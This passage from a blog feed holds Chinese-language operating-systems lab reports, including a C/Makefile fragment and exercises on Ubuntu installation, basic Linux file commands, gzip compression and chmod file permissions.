class="hljs-keyword">void</span> <span class="hljs-title">PrintTest2</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is test2!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//test2.h</span><br><br> <span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> TEST2_H_</span><br> <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TEST2_H_</span><br> <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PrintTest2</span><span class="hljs-params">()</span></span>;<br><br> <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211102154641480.png" alt="image-20211102154641480"></p><p><strong>#使用缩写的Makefile</strong><br>prog:prog1.o prog2.o<br>gcc prog1.o prog2.o -o $@<br>prog1.o:prog1.c lib.h<br>gcc -c -I. -o $@ $&lt;<br>prog2.o:prog2.c<br>gcc -c $*.c</p><p><strong>#使用缩写和宏的Makefile</strong></p><p>MARCO = prog1.o prog2.o<br>prog:$(MARCO)<br>gcc prog1.o prog2.o -o $@<br>prog1.o:prog1.c lib.h<br>gcc -c -I. -o $@ $&lt;<br>prog2.o:prog2.c<br>gcc -c $*.c</p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统实验一</title>
    <link href="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/"/>
    <url>/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="实验1-linux系统安装及初级命令熟悉"><a href="#实验1-linux系统安装及初级命令熟悉" class="headerlink" title="实验1 linux系统安装及初级命令熟悉"></a>实验1 linux系统安装及初级命令熟悉</h2><h3 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h3><ol><li>掌握Ubuntu的安装过程。</li><li>熟悉Linux命令的格式。</li><li>熟悉一些常用的命令。</li><li>熟悉如何使用帮助。</li></ol><h3 id="二、实验要求"><a href="#二、实验要求" class="headerlink" title="二、实验要求"></a>二、实验要求</h3><p>本次实验要求完成以下内容：</p><ul><li>用root登录进入Linux系统，创建自己的账号</li><li>执行常用的命令</li><li>使用特殊控制键，进行命令行的编辑</li><li>使用man命令，来查找特定命令的帮助信息</li></ul><h3 id="三、实验预备知识"><a href="#三、实验预备知识" class="headerlink" title="三、实验预备知识"></a>三、实验预备知识</h3><p>准备Ubuntu镜像，本次实验采用Ubuntu 20.04版本</p><h3 id="四、实验内容"><a href="#四、实验内容" class="headerlink" title="四、实验内容"></a>四、实验内容</h3><h4 id="1-安装linux操作系统"><a href="#1-安装linux操作系统" class="headerlink" title="1. 安装linux操作系统"></a>1. <strong>安装linux操作系统</strong></h4><p>如图所示，Ubuntu系统已经预先安装完成。中文语言输入法均已安装。</p><h4 id><a href="#" class="headerlink" title></a><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029092634926.png" alt="image-20211029092634926"></h4><h4 id="2-基本命令"><a href="#2-基本命令" class="headerlink" title="2. 基本命令"></a>2. <strong>基本命令</strong></h4><h5 id="⑴-在终端用户下为自己创建一个用户"><a href="#⑴-在终端用户下为自己创建一个用户" class="headerlink" title="⑴ 在终端用户下为自己创建一个用户"></a>⑴ 在终端用户下为自己创建一个用户</h5><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029095025375.png" alt="image-20211029095025375"></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029095100329.png" alt="image-20211029095100329"></p><h5 id="⑵-为yuliya用户创建一个密码"><a href="#⑵-为yuliya用户创建一个密码" class="headerlink" title="⑵ 为yuliya用户创建一个密码"></a>⑵ 为yuliya用户创建一个密码</h5><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029095125075.png" alt="image-20211029095125075"></p><h5 id="⑶-登录创建的用户"><a href="#⑶-登录创建的用户" class="headerlink" title="⑶ 登录创建的用户"></a>⑶ 登录创建的用户</h5><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029095223103.png" alt="image-20211029095223103"></p><h5 id="⑷-查看当前用户"><a href="#⑷-查看当前用户" class="headerlink" title="⑷ 查看当前用户"></a>⑷ 查看当前用户</h5><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029095400878.png" alt="image-20211029095400878"></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029095241084.png" alt="image-20211029095241084"></p><h5 id="⑸-查明具体用户"><a href="#⑸-查明具体用户" class="headerlink" title="⑸ 查明具体用户"></a>⑸ 查明具体用户</h5><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029095318256.png" alt="image-20211029095318256"></p><h5 id="⑹-退出当前用户"><a href="#⑹-退出当前用户" class="headerlink" title="⑹ 退出当前用户"></a>⑹ 退出当前用户</h5><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029095338451.png" alt="image-20211029095338451"></p><h5 id="⑺-在命令行下进行关机操作"><a href="#⑺-在命令行下进行关机操作" class="headerlink" title="⑺ 在命令行下进行关机操作"></a>⑺ 在命令行下进行关机操作</h5><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029095831358.png" alt="image-20211029095831358"></p><h5 id="⑻-重新启动"><a href="#⑻-重新启动" class="headerlink" title="⑻ 重新启动"></a>⑻ 重新启动</h5><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029102955840.png" alt="image-20211029102955840"></p><h4 id="3-特殊键的使用"><a href="#3-特殊键的使用" class="headerlink" title="3. 特殊键的使用"></a>3. 特殊键的使用</h4><p>回车键RETURN或者CONTROL-m或CTL-m，它表示输入行结束<br>CTL-d   它表示终端的输入结束；<br>CTL-g   控制终端响铃；<br>CTL-h   称为退格键，用于改正输入的错误；<br>CTL-i    常称作Tab键<br>DELETE键表示立即终止程序<br>BREAK键与DELETE键、CTL-c的功能</p><h4 id="4-linux下的帮助命令"><a href="#4-linux下的帮助命令" class="headerlink" title="4. linux下的帮助命令"></a>4. linux下的帮助命令</h4><h5 id="⑴-man-命令"><a href="#⑴-man-命令" class="headerlink" title="⑴ #man 命令"></a>⑴ #man 命令</h5><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029103608022.png" alt="image-20211029103608022"></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029103551797.png" alt="image-20211029103551797"></p><h5 id="⑵-help"><a href="#⑵-help" class="headerlink" title="⑵ #help"></a>⑵ #help</h5><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029103740702.png" alt="image-20211029103740702"></p><h5 id="⑶-命令-–help"><a href="#⑶-命令-–help" class="headerlink" title="⑶ #命令 –help"></a>⑶ #命令 –help</h5><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029103908087.png" alt="image-20211029103908087"></p><h4 id="5-文本编辑器"><a href="#5-文本编辑器" class="headerlink" title="5. 文本编辑器"></a>5. 文本编辑器</h4><p>要在linux下编写文本或语言程序，可以选择适用vi，pico，joe，jove，mc编辑器等这样的文本模式，还可以使用像Gedit，Kate等视窗环境下的编辑器，或是使用KDevelop，它是在linux下的XWindow下执行的C/C++整合式开发环境。</p><h2 id="实验2-文件目录与操作"><a href="#实验2-文件目录与操作" class="headerlink" title="实验2 文件目录与操作"></a>实验2 文件目录与操作</h2><h3 id="一、实验目的-1"><a href="#一、实验目的-1" class="headerlink" title="一、实验目的"></a>一、实验目的</h3><p>使学生熟悉目录与文件的操作</p><h3 id="二、实验要求-1"><a href="#二、实验要求-1" class="headerlink" title="二、实验要求"></a>二、实验要求</h3><p>本次实验要求完成下列内容：</p><ul><li>显示当前目录的目录名</li><li>改变当前目录</li><li>使用ls命令的各种选项查看文件与目录属性</li><li>创建和删除目录</li><li>创建0长度的文件</li><li>拷贝、移动、重命名及删除文件</li><li>查看文件的内容</li><li>对文件和目录进行压缩和解压缩</li></ul><h3 id="三、实验预备知识-1"><a href="#三、实验预备知识-1" class="headerlink" title="三、实验预备知识"></a>三、实验预备知识</h3><h4 id="1-什么是文件"><a href="#1-什么是文件" class="headerlink" title="1. 什么是文件"></a>1. 什么是文件</h4><p>从通常意义上来说，文件是一些数据的集合，这些数据通常是文本或机器操作码。用户所创建的大多数文件都是文本文件，而在Linux上运行的大多数程序则是机器操作码文件。每当执行一条Linux命令时，就是告诉计算机去执行某个文件或某组文件中的命令，这样的文件以半永久的形式存储在像磁盘或磁带这样的稳定介质中。</p><p> 在Linux系统中，除了通常意义上的文件外，每个物理实体也都是以文件的形式出现的。Linux系统视所有文件为简单的数据字节序列，但用户或应用程序可以对文件内容附加特定的结构。</p><h4 id="2-什么是目录"><a href="#2-什么是目录" class="headerlink" title="2. 什么是目录"></a>2. 什么是目录</h4><p>目录是文件系统中的一个单元，它存放着各种文件。事实上，Linux系统中的每个文件都是包含在某个目录中的。这样的安排保持了文件的组织，并减少系统寻找某一特定文件所花的时间。</p><p>在Linux系统中，目录实际上也是一种文件。它不包含文本或可执行的机器操作码，但它具有文件名列表和有关这些文件的其它信息。</p><p>由于目录也是一种文件，因此也可以把一个目录放到另一个目录中。这有助于作为整体解释文件系统，因为系统实际上是目录和文件组成的层次结构。</p><h4 id="3-文件的命名规则"><a href="#3-文件的命名规则" class="headerlink" title="3. 文件的命名规则"></a>3. 文件的命名规则</h4><p>为了区别各个文件，必须给每个文件取个名字。在Linux系统中，一个合格的文件名由字母、数字和某些特殊符号组成。文件名中不应该包含空格、制表符、换行符和退格符，也不应该包含任何对shell有特定含义的字符，这些特定字符包括：`!@#$%^&amp;*()|[]{}’”;&lt;&gt;/</p><h4 id="4-文件系统的层次结构"><a href="#4-文件系统的层次结构" class="headerlink" title="4. 文件系统的层次结构"></a>4. 文件系统的层次结构</h4><p>Linux的文件系统是一个包含文件和目录的层次结构，被称为目录树。目录树的最顶端只有一个目录，被称为根（root）目录。根目录以斜线字符（/）表示，由它再分支出若干其他目录和文件，。这些目录中的每一个又可能再分支出其他的一些目录和文件。下图显示了一个典型的Linux文件系统的部分结构。</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029104920799.png" alt="image-20211029104920799"></p><p>在图中，home是/的子目录，jame、john和sjp是home的子目录。相应地，/是bin、dev、lib、home和usr等的父目录，home又是jame、john和sjp的父目录。</p><h4 id="5-Linux一些主要的标准目录"><a href="#5-Linux一些主要的标准目录" class="headerlink" title="5. Linux一些主要的标准目录"></a>5. Linux一些主要的标准目录</h4><p>/bin目录保存引导系统所需要的全部可执行程序以及最常用的Linux命令。</p><p>/boot目录用来存放Linux启动时所需要的一些数据和文件。</p><p>/dev目录包含有链接硬件设备的文件。</p><p>/etc目录含用于管理Linux系统的文件和工具。</p><p>/home目录用来存放各个用户的主目录。</p><p>/lib目录含有C编译程序所需要的函数库。</p><p>/usr目录包含X Windows系统的可执行程序、函数库以及游戏等。</p><h3 id="四、实验内容-1"><a href="#四、实验内容-1" class="headerlink" title="四、实验内容"></a>四、实验内容</h3><h4 id="1-显示当前目录的目录名"><a href="#1-显示当前目录的目录名" class="headerlink" title="1. 显示当前目录的目录名"></a>1. 显示当前目录的目录名</h4><p>使用pwd命令，确认你现在所处的目录。命令pwd可以告诉用户目前是在哪个目录中，这一命令将显示当前目录的全路径名。</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029111012656.png" alt="image-20211029111012656"></p><h4 id="2-改变当前目录"><a href="#2-改变当前目录" class="headerlink" title="2. 改变当前目录"></a>2. 改变当前目录</h4><p>命令cd使用方式为cd [目录路径名]，用于变换工作目录至指定目录，[目录路径名]可为相对路径，也可以为绝对路径。</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029111604450.png" alt="image-20211029111604450"></p><h4 id="3-使用ls命令的各种选项查看文件与目录属性"><a href="#3-使用ls命令的各种选项查看文件与目录属性" class="headerlink" title="3. 使用ls命令的各种选项查看文件与目录属性"></a>3. 使用ls命令的各种选项查看文件与目录属性</h4><p>用户经常要查看某个目录中有哪些文件和子目录，这可以使用ls命令来完成。ls命令有非常多的选项，用来修正ls命令的行为，以便满足<br>用户的不同需求。</p><ul><li><p>在最简单的情况下，ls命令可以不带任何实参。这时ls命令将以字母顺序列出当前目录中的所有文件和子目录的名字。</p><ul><li>命令为：$ls </li></ul><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029112513317.png" alt="image-20211029112513317"></p></li><li><p>使用带参数“l”(小写的“L”)的ls命令可以显示当前目录下所有的文件名、文件的类型、文件的访问权限、文件的链接数、文件拥有者及其所属的组、文件大小和文件最近一次被修改的日期和时间等属性。</p><ul><li>命令为：$ls -l</li></ul><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029112536299.png" alt="image-20211029112536299"></p></li><li><p>有些情况下命令ls任何输出，并不表示该目录中没有文件和子目录，因为通常情况下ls命令并不显示隐含文件(或目录) 。要显示隐含文件，可以使用参数“a”的ls命令。</p><ul><li>命令为：$ls -a</li></ul><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029112607485.png" alt="image-20211029112607485"></p></li><li><p>要列出某个目录下的所有文件，包括其任何一层子目录下的文件，可以用带参数“R”的ls命令实现。该命令递归地显示指定目录(或当前目录)下的所有内容。</p><ul><li>命令为：$ls -R</li></ul><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029112705638.png" alt="image-20211029112705638"></p></li></ul><h4 id="4-创建和删除目录"><a href="#4-创建和删除目录" class="headerlink" title="4. 创建和删除目录"></a>4. 创建和删除目录</h4><h5 id="1-创建目录"><a href="#1-创建目录" class="headerlink" title="(1) 创建目录"></a>(1) 创建目录</h5><p>每个用户在实际中都需要创建自己的目录，这是通过mkdir命令来完成的。</p><p>语法形式为：$ mkdir [-p] dirName，<br>用于建立名称为dirName 之子目录。其中，参数-p确保目录名称存在，不存在的就建一个。</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029113441518.png" alt="image-20211029113441518"></p><h5 id="2-删除目录"><a href="#2-删除目录" class="headerlink" title="(2) 删除目录"></a>(2) 删除目录</h5><p>删除目录的命令为rmdir，使用语法为：$rmdir [dirName]</p><p>作用是删除目录名为dirName的目录。</p><ul><li>注意：rmdir命令不能删除一个非空的目录。</li></ul><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029113655911.png" alt="image-20211029113655911"></p><h4 id="5-创建0长度的文件"><a href="#5-创建0长度的文件" class="headerlink" title="5. 创建0长度的文件"></a>5. 创建0长度的文件</h4><p>touch命令用于改变档案的时间记录。touch使用方式touch [-acfm] [-r reference-file] [-t MMDDhhmm [[CC][YY][.ss]] [-dtime] [–date=time] [–time] [–version]file1 [file2 …]</p><p>其中，touch命令的参数为：a改变档案的读取时间记录。m改变档案的修改时间记录。c假如目的档案不存在，不会建立新的档案。r使用参考文件的时间记录。d设定时间与日期。t设定档案的时间记录。</p><p>touch的另外一个功能就是创建一个0长度的文件。<br>例如，使用touch命令在OS目录创建名为myfile1,myfile2的两个文件：<br>$ touch myfile1 myfile2</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029114053508.png" alt="image-20211029114053508"></p><h4 id="6-拷贝、移动、重命名及删除文件"><a href="#6-拷贝、移动、重命名及删除文件" class="headerlink" title="6. 拷贝、移动、重命名及删除文件"></a>6. 拷贝、移动、重命名及删除文件</h4><h5 id="1-文件的拷贝"><a href="#1-文件的拷贝" class="headerlink" title="(1) 文件的拷贝"></a>(1) 文件的拷贝</h5><p>使用cp命令可以将某个文件复制一份，cp命令的一般语法形式为如下：cp &lt;原文件路径名&gt; &lt;新文件路径名&gt;</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029114825468.png" alt="image-20211029114825468"></p><h5 id="2-文件的移动和文件的重命名"><a href="#2-文件的移动和文件的重命名" class="headerlink" title="(2) 文件的移动和文件的重命名"></a>(2) 文件的移动和文件的重命名</h5><ul><li><p>命令mv可以对某个文件进行改名，以及将某个文件从一个文件夹移动到另一个文件夹。<br>使用方式：mv [-i] &lt;文件原路径&gt; &lt;文件新路径&gt;<br>说明：将一个档案移至另一档案，或将数个档案移至另一目录。<br>参数：-i 若目的地已有同名档案，则先询问是否覆盖旧档</p></li><li><p>改名</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029115420223.png" alt="image-20211029115420223"></p></li><li><p>移动</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029115710886.png" alt="image-20211029115710886"></p></li></ul><h5 id="3-删除文件"><a href="#3-删除文件" class="headerlink" title="(3) 删除文件"></a>(3) 删除文件</h5><p>删除文件命令为：rm<br>使用方式：rm [-options] 文件名</p><p>options参数：<br>-i 删除前逐一询问确认。<br>-f 直接删除档案，无需逐一确认。<br>-r 将目录及以下之档案逐一删除。</p><p>示例：</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029120134543.png" alt="image-20211029120134543"></p><h4 id="7-查看文件的内容"><a href="#7-查看文件的内容" class="headerlink" title="7. 查看文件的内容"></a>7. 查看文件的内容</h4><p>cat和more这两个命令可以查看文件的内容。</p><h5 id="1-cat命令"><a href="#1-cat命令" class="headerlink" title="(1) cat命令"></a>(1) cat命令</h5><ul><li><p>使用方式：cat [-option] fileName</p></li><li><p>参数：</p><p>-n 由1开始对所有输出的行数编号</p><p>-b 和-n 相似，不过对于空白行不编号</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029120548660.png" alt="image-20211029120548660"></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029120612315.png" alt="image-20211029120612315"></p></li></ul><h5 id="2-more命令"><a href="#2-more命令" class="headerlink" title="(2) more命令"></a>(2) more命令</h5><ul><li><p>使用方式：more [-option] [+/pattern] [+linenum] [fileNames]</p></li><li><p>使用范例</p><p>从第20 行开始显示testfile 之档案内容</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029120937071.png" alt="image-20211029120937071"></p><p>查看/etc/passwd文件的内容：</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029121012612.png" alt="image-20211029121012612"></p></li></ul><h4 id="8-对文件和目录进行压缩和解压缩"><a href="#8-对文件和目录进行压缩和解压缩" class="headerlink" title="8. 对文件和目录进行压缩和解压缩"></a>8. 对文件和目录进行压缩和解压缩</h4><ul><li><p>压缩文件可以减少所需的存储空间，也可以减少网络传输文件所需的时间，因此压缩和解压缩在Linux中很常用。Linux中压缩和解压缩的指令很多，如gzip、zip、bzip2等等，这里介绍比较常用的gzip指令。</p></li><li><p>使用方法：gzip [-option] [-S &lt;压缩字尾字 符串&gt;] [-&lt;压缩效率&gt;] [–best/fast] [文件]</p></li><li><p>补充说明：gzip是个使用广泛的压缩程序，文件经它压缩过后，其名称后面会多出”.gz”的扩展名。</p></li><li><p>使用范例：</p><ul><li><p>对文件np使用gzip命令进行压缩：<br>$ gzip np</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029121428777.png" alt="image-20211029121428777"></p></li><li><p>将np压缩后的文件进行解压缩并列出详细信息<br>$ gzip -dv np.gz</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029121510000.png" alt="image-20211029121510000"></p></li><li><p>将goodstuff目录下的所有文件进行压缩：<br>$ gzip -r goodstuff</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029121702889.png" alt="image-20211029121702889"></p></li><li><p>对goodstuff目录进行解压缩：<br>$ gzip –dr g oodstuff</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029121727712.png" alt="image-20211029121727712"></p></li></ul></li></ul><h2 id="实验3-权限"><a href="#实验3-权限" class="headerlink" title="实验3 权限"></a>实验3 权限</h2><h3 id="一、实验目的-2"><a href="#一、实验目的-2" class="headerlink" title="一、实验目的"></a>一、实验目的</h3><p>给学生一个操作文件与目录权限的机会。作完这些练习之后，使学生能够对LINUX中文件所有者的概念和权限的概念有基本的理解。</p><h3 id="二、实验要求-2"><a href="#二、实验要求-2" class="headerlink" title="二、实验要求"></a>二、实验要求</h3><p>本次实验要求完成下列内容：</p><ul><li>使用长列表命令来查看文件与目录的信息</li><li>能够解释文件与目录权限中各位的含义</li><li>能够对普通文件与目录的权限进行操作</li><li>能够更改文件和目录所属的用户和</li></ul><h3 id="三、实验预备知识-2"><a href="#三、实验预备知识-2" class="headerlink" title="三、实验预备知识"></a>三、实验预备知识</h3><p>在linux系统中，每个文件或者一个目录属于一个用户或一个组。Linux权限通过允许每个文件系统对象设置三种独立的权限级别来工作。3种独立的权限级别为：</p><ul><li>文件拥有者(u)；</li><li>文件拥有者所在用户组中的其它成员(g)；</li><li>所有其它用户(o)。</li></ul><p>每个文件均拥有下列三种权限：</p><ul><li>read (r): 查看文件内容</li><li>write (w): 修改文件</li><li>execute (x): 如同命令一样执行文件</li></ul><p>每个目录均拥有下列三种权限：</p><ul><li>read (r): 列出目录内容</li><li>write (w): 在目录中增删文件</li><li>execute (x): 访问目录中的文件</li></ul><p>当你创建一个文件的时候，系统保存了有关该文件的全部信息，包括：</p><ul><li>文件的位置。</li><li>文件类型。</li><li>文件长度。</li><li>哪位用户拥有该文件，哪些用户可以访问该文件。</li><li>i节点。</li><li>文件的修改时间。</li><li>文件的权限位。</li></ul><p>在进行各种操作时，首先必须弄清楚自己所在的目录。如果你对自己目前的位置失去了感觉，那么各种命令可能都会失效。最有效的方法就是，经常使用pwd命令，来查看你所在的当前目录。</p><h3 id="四、实验内容-2"><a href="#四、实验内容-2" class="headerlink" title="四、实验内容"></a>四、实验内容</h3><h4 id="1-使用长列表命令来查看文件与目录的信息"><a href="#1-使用长列表命令来查看文件与目录的信息" class="headerlink" title="1. 使用长列表命令来查看文件与目录的信息"></a>1. 使用长列表命令来查看文件与目录的信息</h4><p>对一个文件使用ls –l 命令，就会按如下顺序显示下列信息：</p><ul><li><p>文件类型（第1个字符）</p><ul><li>-: 普通文件</li><li>d: 目录</li><li>l: 符号链接</li><li>c: 字符型设备节点</li><li>b: 块设备节点</li></ul></li><li><p>文件访问权限（接下来的9个字符，每3个一组依次代表user、group和other）</p></li><li><p>文件的硬链接数 </p></li><li><p>文件拥有user的用户名</p></li><li><p>文件所属group的用户组名</p></li><li><p>文件的字符数size (bytes)</p></li><li><p>文件的date and time (mtime)</p></li><li><p>文件的name</p></li></ul><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029162532418.png" alt="image-20211029162532418"></p><h4 id="2-解释文件与目录权限中各位的含义"><a href="#2-解释文件与目录权限中各位的含义" class="headerlink" title="2. 解释文件与目录权限中各位的含义"></a>2. 解释文件与目录权限中各位的含义</h4><p>对于文件a.out</p><p>第一个字符为-，表示它是一个普通文件，接下来9个字符每三位分别代表所有者权限、同组用户权限和其他用户权限，在上例中，九个字符分别为：rwx、rwx、r-x，因此a.out文件具有所有者类中的读写和执行权限，对于组类也有读写和执行权限，而对于其他用户类也只有读和执行权限。</p><p>后面的信息依次表示a.out文件的硬链接数为1，文件所属的用户名为zino，文件所属组名为zino，文件大小为16696byte，最后是文件创建的时间为6月21日19:22和文件名为a.out。</p><h4 id="3-对普通文件与目录的权限进行操作"><a href="#3-对普通文件与目录的权限进行操作" class="headerlink" title="3. 对普通文件与目录的权限进行操作"></a>3. 对普通文件与目录的权限进行操作</h4><p>改变文件权限的命令是chmod</p><ul><li><p>chmod命令的一般格式为:  chmod [who] operator [permission] filename</p></li><li><p>who 的含义是：</p><ul><li>u 文件属主权限。</li><li>g 同组用户权限。</li><li>o 其他用户权限。</li><li>a 所有用户(所有者、同组用户及其他用户)。</li></ul></li><li><p>operator的含义：</p><ul><li>+  增加权限。</li><li>-   取消权限。</li><li>=  设定权限。</li></ul></li><li><p>permission的含义：</p><ul><li>r 读权限。</li><li>w 写权限。</li><li>x 执行权限。</li><li>s 文件属主和组set-ID。</li><li>t 粘性位*。</li><li>l 给文件加锁，使其他用户无法访问。</li></ul></li><li><p>举例：<br>$chmod a-x  a.out  